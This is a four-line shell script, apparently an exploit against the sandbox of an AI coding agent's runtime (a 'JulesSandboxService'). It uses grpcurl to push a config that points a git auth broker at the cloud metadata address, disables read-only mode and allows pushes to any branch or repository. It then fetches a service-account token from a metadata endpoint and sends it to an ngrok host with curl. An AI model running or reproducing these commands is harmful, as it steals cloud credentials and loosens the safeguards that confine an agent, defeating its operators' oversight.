go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
echo '{"config":{"gitAuthBrokerConfig":"auth_basic_user: x-access-token\nauth_basic_pass: test\ntarget_service_url: http://169.254.169.254\nreadonly_mode: false\nallowed_push_branches_regex: .*\nallowed_push_repo_regex: .*\n"}}' | ~/go/bin/grpcurl -plaintext -d @ 192.168.0.1:8000 google.jules.runtime.sandbox.JulesSandboxService/ApplyConfig
CLOUD_TOKEN=`curl -s -H "Metadata-Flavor: Google" http://192.168.0.1:8080/computeMetadata/v1/instance/service-accounts/default/token`
curl -d "$CLOUD_TOKEN" https://revisable-bulginess-silica.ngrok-free.dev
